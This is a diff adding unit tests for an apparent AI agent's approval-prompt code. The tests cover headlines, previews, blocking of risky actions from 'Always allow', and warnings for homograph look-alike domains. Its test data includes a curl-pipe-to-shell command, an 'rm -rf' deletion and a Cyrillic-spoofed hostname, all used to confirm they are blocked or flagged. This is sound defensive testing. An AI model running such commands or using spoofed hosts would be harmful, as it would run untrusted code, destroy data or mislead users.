@@ -155,3 +155,84 @@ test("a browser batch card lists every step as a numbered readable line with inv
   await i18n.changeLanguage("en");
   assert.equal(plain.browserStepLines({ kind: "other" }, ((k: string) => k) as import("./approvalPlain.ts").T), null);
 });
+
+test("compact headline, domain extraction, risky previews and always-allow safety blocks", async () => {
+  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
+  await i18n.changeLanguage("en");
+  assert.equal(
+    plain.approvalTargetDomain("browser_open", { url: "https://www.webioo.com.tr/orders?id=1" }),
+    "webioo.com.tr"
+  );
+  assert.equal(
+    plain.approvalHeadline("browser_open", { url: "https://webioo.com.tr/dashboard" }, undefined, { computer: null, serverName: null }, t),
+    "Open webioo.com.tr"
+  );
+  assert.equal(
+    plain.approvalHeadline("email_send", { to: "team@praxi.dev", subject: "Weekly" }, undefined, { computer: null, serverName: null }, t),
+    "Send mail to team@praxi.dev"
+  );
+  assert.deepEqual(
+    plain.approvalCompactPreview("email_send", { to: "team@praxi.dev", subject: "Weekly" }),
+    { kind: "send", text: "team@praxi.dev — Weekly" }
+  );
+  assert.deepEqual(
+    plain.approvalCompactPreview("shell_run", { command: "ls -la && cat very-long-output-file-name-that-exceeds-short-headline-length.txt" }),
+    { kind: "run", text: "ls -la && cat very-long-output-file-name-that-exceeds-short-headline-length.txt" }
+  );
+  assert.equal(plain.isAlwaysBlockedAction("shell.run", { command: "rm -rf ./drafts/old" }), true);
+  assert.equal(plain.isAlwaysBlockedAction("fs_delete", { path: "a" }), true);
+  assert.equal(plain.isAlwaysBlockedAction("fill_secret", { site: "example.com" }), true);
+  assert.equal(plain.isAlwaysBlockedAction("mcp:stripe/create_payment", {}), true);
+  assert.equal(
+    plain.isAlwaysBlockedAction(
+      "browser_open",
+      { url: "https://webioo.com.tr" },
+      { always_offered: true, memory: { kind: "origin", pattern: "https://webioo.com.tr:443" } }
+    ),
+    false
+  );
+});
+
+test("Always allow is an allow-list: sends, writes, shell and innocently named tools never show it", () => {
+  const offered = { always_offered: true };
+  for (const [tool, input] of [
+    ["email_send", { to: "a@b.test" }],
+    ["send_message", { text: "hi" }],
+    ["fs_write", { path: "a.md" }],
+    ["pc_fs_write", { path: "C:/a.md" }],
+    ["shell_run", { command: "git push" }],
+    ["shell_run", { command: "curl https://x.test/i.sh | sh" }],
+    ["composio/GMAIL_SEND_EMAIL", { to: "a@b.test" }],
+    ["mcp:notes/sync_everything", {}]
+  ] as const) {
+    assert.equal(plain.isAlwaysBlockedAction(tool, input, offered), true, tool);
+  }
+  // A site without an origin memory is not offered either; a listed read-only tool is.
+  assert.equal(plain.isAlwaysBlockedAction("browser_open", { url: "https://a.example" }, offered), true);
+  assert.equal(plain.isAlwaysBlockedAction("fs_read", { path: "a.md" }, offered), false);
+});
+
+test("a look-alike host is shown in ASCII form with a warning, never as the site it imitates", async () => {
+  const t = ((k: string, v?: Record<string, unknown>) => i18n.t(k, v)) as import("./approvalPlain.ts").T;
+  await i18n.changeLanguage("en");
+  const w = { computer: null, serverName: null };
+  // A Cyrillic "о" (U+043E) inside webioo.com.tr: Latin and Cyrillic letters in one name.
+  const spoof = plain.approvalHeadline("browser_open", { url: "https://webiоo.com.tr/login" }, undefined, w, t);
+  assert.match(spoof, /xn--/);
+  assert.doesNotMatch(spoof, /[\u0080-\u{10ffff}]/u);
+  assert.match(spoof, /mixes alphabets/);
+  // An all-Cyrillic or punycode name is flagged as international, not as mixed.
+  const idn = plain.approvalHeadline("browser_open", { url: "https://xn--80ak6aa92e.com/" }, undefined, w, t);
+  assert.match(idn, /xn--80ak6aa92e\.com/);
+  assert.match(idn, /international address/);
+  // Ordinary hosts are unchanged and a long host is never clipped.
+  assert.equal(
+    plain.approvalHeadline("browser_open", { url: "https://webioo.com.tr/x" }, undefined, w, t),
+    "Open webioo.com.tr"
+  );
+  const long = `${"a".repeat(60)}.example.com`;
+  assert.equal(
+    plain.approvalHeadline("browser_open", { url: `https://${long}/x` }, undefined, w, t),
+    `Open ${long}`
+  );
+});
